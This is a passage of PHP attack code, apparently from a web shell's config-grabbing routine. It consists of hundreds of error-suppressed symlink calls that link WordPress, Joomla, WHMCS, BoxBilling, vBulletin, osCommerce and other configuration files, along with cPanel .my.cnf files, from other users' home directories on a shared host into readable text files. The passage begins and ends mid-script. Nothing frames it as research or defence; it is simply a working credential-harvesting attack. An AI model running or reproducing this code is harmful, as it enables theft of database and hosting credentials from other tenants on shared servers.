@symlink('/home7/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home7/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home7/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home7/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home7/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 8 

@symlink('/home8/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home8/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home8/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home8/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home8/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home8/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home8/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home8/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home8/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home8/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home8/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home8/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 9 

@symlink('/home9/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home9/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home9/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home9/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home9/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home9/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home9/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
